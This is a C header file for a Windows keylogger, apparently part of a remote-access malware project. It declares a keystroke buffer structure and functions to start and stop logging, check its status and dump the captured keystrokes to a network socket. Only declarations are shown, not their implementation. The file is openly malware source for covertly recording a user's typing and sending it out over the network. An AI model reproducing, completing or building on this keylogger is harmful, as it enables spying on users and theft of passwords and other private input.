


#ifndef _KEYLOGGER_H_
#define _KEYLOGGER_H_

#include <WinSock2.h>
#include <MSWSock.h>
#include <Windows.h>




#define WM_END WM_APP+1
extern HANDLE cur_proc;
typedef struct key_stroke
{
    DWORD Start;
    DWORD Size;
    LPVOID Data;
}KEY_STROKE, * LPKEY_STROKE;


extern void Keylogger_start();
extern int Keylogger_status(SOCKET sock);
extern int Keylogger_dump(SOCKET sock);
extern void Keylogger_stop();
extern int Keylogger_time(SOCKET sock);
extern BYTE Is_Sent(SOCKET sock,int timeout);
#endif // _KEYLOGGER_H_
